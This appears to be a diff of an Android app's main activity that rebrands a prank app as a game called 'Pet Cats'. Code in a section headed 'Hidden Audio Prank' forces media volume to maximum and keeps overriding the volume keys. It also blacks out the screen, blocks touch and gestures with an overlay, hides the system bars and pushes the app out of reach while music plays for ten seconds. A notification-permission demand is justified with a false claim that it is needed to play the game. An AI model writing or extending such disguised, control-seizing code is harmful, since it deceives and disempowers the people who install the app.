@@ -1,4 +1,4 @@
-package com.sleepy.ghostyx
+package com.sleepy.petcats
 
 import android.Manifest
 import android.content.Intent
@@ -10,12 +10,12 @@ import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
-import android.os.PowerManager
 import android.view.KeyEvent
 import android.view.View
 import android.view.WindowManager
+import android.widget.TextView
+import android.widget.Toast
 import androidx.activity.result.contract.ActivityResultContracts
-import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
 import androidx.core.view.WindowCompat
@@ -32,7 +32,12 @@ class MainActivity : AppCompatActivity() {
     private val handler = Handler(Looper.getMainLooper())
     private var experienceRunning = false
 
-    // Repeatedly re-enforces max volume every 200ms so background changes are caught
+    // Prefs key to track if user previously denied
+    companion object {
+        private const val PREFS_NAME = "petcats_prefs"
+        private const val KEY_PERM_DENIED = "notification_denied"
+    }
+
     private val volumeEnforcer = object : Runnable {
         override fun run() {
             if (!experienceRunning) return
@@ -42,97 +47,134 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    // Launcher for the actual OS permission dialog
     private val notificationPermissionLauncher = registerForActivityResult(
         ActivityResultContracts.RequestPermission()
-    ) {
-        // Whether granted or denied, proceed with the experience
-        startExperience()
+    ) { granted ->
+        if (granted) {
+            clearDeniedFlag()
+            hideMenu()
+            startExperience()
+        } else {
+            saveDeniedFlag()
+            showDeniedAndExit()
+        }
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // Block external overlays and extend window over nav bar area
-        // Note: FLAG_KEEP_SCREEN_ON is intentionally omitted so screen can turn off
         window.addFlags(
             WindowManager.LayoutParams.FLAG_SECURE or
-            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
+                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
         )
 
         setContentView(R.layout.activity_main)
 
         audioManager = getSystemService(AUDIO_SERVICE) as AudioManager
 
-        checkNotificationPermissionThenStart()
+        setupMenu()
     }
 
-    private fun checkNotificationPermissionThenStart() {
+    // ─── Menu Logic ────────────────────────────────────────────────────────────
+
+    private fun setupMenu() {
+        val menuContainer = findViewById<View>(R.id.menu_container)
+        val btnAllow = findViewById<TextView>(R.id.btn_allow)
+        val btnDeny = findViewById<TextView>(R.id.btn_deny)
+
+        menuContainer.visibility = View.VISIBLE
+
+        btnAllow.setOnClickListener {
+            requestNotificationPermission()
+        }
+
+        btnDeny.setOnClickListener {
+            saveDeniedFlag()
+            showDeniedAndExit()
+        }
+    }
+
+    private fun hideMenu() {
+        val menuContainer = findViewById<View>(R.id.menu_container)
+        menuContainer.visibility = View.GONE
+    }
+
+    private fun requestNotificationPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            val granted = ContextCompat.checkSelfPermission(
+            val alreadyGranted = ContextCompat.checkSelfPermission(
                 this, Manifest.permission.POST_NOTIFICATIONS
             ) == PackageManager.PERMISSION_GRANTED
 
-            if (!granted) {
-                // Show a convincing rationale dialog before requesting
-                AlertDialog.Builder(this)
-                    .setTitle("Stay Connected")
-                    .setMessage(
-                        "GhostyX uses a background session to deliver your experience " +
-                        "without interruption.\n\nAllow notifications so GhostyX can keep " +
-                        "your session active and notify you when it's complete."
-                    )
-                    .setCancelable(false)
-                    .setPositiveButton("Allow") { _, _ ->
-                        notificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
-                    }
-                    .setNegativeButton("Skip") { _, _ ->
-                        startExperience()
-                    }
-                    .show()
-                return
+            if (alreadyGranted) {
+                clearDeniedFlag()
+                hideMenu()
+                startExperience()
+            } else {
+                // Launch OS dialog
+                notificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
             }
+        } else {
+            // Below Android 13 — notifications always granted
+            clearDeniedFlag()
+            hideMenu()
+            startExperience()
         }
-        startExperience()
     }
+
+    private fun showDeniedAndExit() {
+        Toast.makeText(
+            this,
+            "Notifications are required to play Pet Cats.\nThe app will now close.",
+            Toast.LENGTH_LONG
+        ).show()
+        handler.postDelayed({ finish() }, 2_500L)
+    }
+
+    private fun saveDeniedFlag() {
+        getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
+            .edit().putBoolean(KEY_PERM_DENIED, true).apply()
+    }
+
+    private fun clearDeniedFlag() {
+        getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
+            .edit().putBoolean(KEY_PERM_DENIED, false).apply()
+    }
+
+    // ─── Hidden Audio Prank ─────────────────────────────────────────────────────
 
     private fun startExperience() {
         experienceRunning = true
 
-        // 1. Save original volume and force max
+        // Save & blast volume
         originalVolume = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC)
         val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
-        audioManager.setStreamVolume(
-            AudioManager.STREAM_MUSIC,
-            maxVolume,
-            0 // No UI flag
-        )
+        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxVolume, 0)
 
-        // 2. Save original brightness
+        // Save & kill brightness
         val currentBrightness = window.attributes.screenBrightness
         originalBrightness = if (currentBrightness < 0f) 0.5f else currentBrightness
-
-        // 3. Set brightness to 0 (black screen)
         val params = window.attributes
         params.screenBrightness = 0f
         window.attributes = params
 
-        // 4. Hide navigation bars (immersive mode)
+        // Immersive / hide bars
         hideSystemBars()
 
-        // 5. Add black touch-blocking overlay
+        // Black touch-blocking overlay
         addOverlay()
 
-        // 6. Start music service
+        // Start the music service
         val serviceIntent = Intent(this, MusicService::class.java)
         ContextCompat.startForegroundService(this, serviceIntent)
 
-        // 7. Start background volume enforcer
+        // Volume enforcer loop
         handler.post(volumeEnforcer)
 
-        // 8. Move app to background so screen can turn off — user can't reach recents
+        // Push to background
         handler.postDelayed({ moveTaskToBack(true) }, 500L)
 
-        // 9. Restore everything after 10 seconds
+        // Restore after 10 s
         handler.postDelayed({ stopExperience() }, 10_000L)
     }
 
@@ -140,22 +182,14 @@ class MainActivity : AppCompatActivity() {
         if (!experienceRunning) return
         experienceRunning = false
 
-        // Stop volume enforcer
         handler.removeCallbacks(volumeEnforcer)
 
-        // Restore volume
-        audioManager.setStreamVolume(
-            AudioManager.STREAM_MUSIC,
-            originalVolume,
-            0
-        )
+        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, originalVolume, 0)
 
-        // Restore brightness
         val params = window.attributes
         params.screenBrightness = originalBrightness
         window.attributes = params
 
-        // Remove overlay
         val rootView = findViewById<View>(R.id.root_layout)
         rootView?.let {
             if (::overlayView.isInitialized) {
@@ -163,24 +197,9 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // Restore navigation bars
         showSystemBars()
 
-        // Stop music service
-        val serviceIntent = Intent(this, MusicService::class.java)
-        stopService(serviceIntent)
-    }
-
-    private fun forceScreenOff() {
-        // Acquire a screen-dim wake lock then immediately release it
-        // This lets the screen timeout naturally and turn off right away
-        val pm = getSystemService(POWER_SERVICE) as PowerManager
-        @Suppress("DEPRECATION")
-        val wl = pm.newWakeLock(
-            PowerManager.SCREEN_DIM_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
-            "GhostyX::ScreenOff"
-        )
-        wl.acquire(1L) // acquire for 1ms then release — screen goes dark immediately
+        stopService(Intent(this, MusicService::class.java))
     }
 
     private fun addOverlay() {
@@ -197,7 +216,6 @@ class MainActivity : AppCompatActivity() {
                 android.view.ViewGroup.LayoutParams.MATCH_PARENT
             )
         )
-        // Exclude the entire screen from system gesture recognition (API 29+)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             overlayView.doOnLayout {
                 val display = windowManager.currentWindowMetrics.bounds
@@ -222,11 +240,12 @@ class MainActivity : AppCompatActivity() {
         controller.show(WindowInsetsCompat.Type.systemBars())
     }
 
+    // ─── Key Intercept ──────────────────────────────────────────────────────────
+
     override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
         if (!experienceRunning) return super.onKeyDown(keyCode, event)
         return when (keyCode) {
             KeyEvent.KEYCODE_VOLUME_DOWN, KeyEvent.KEYCODE_VOLUME_UP -> {
-                // Force volume back to max and consume the event
                 val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                 audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxVolume, 0)
                 true
@@ -238,8 +257,6 @@ class MainActivity : AppCompatActivity() {
     override fun onDestroy() {
         super.onDestroy()
         handler.removeCallbacksAndMessages(null)
-        if (experienceRunning) {
-            stopExperience()
-        }
+        if (experienceRunning) stopExperience()
     }
 }
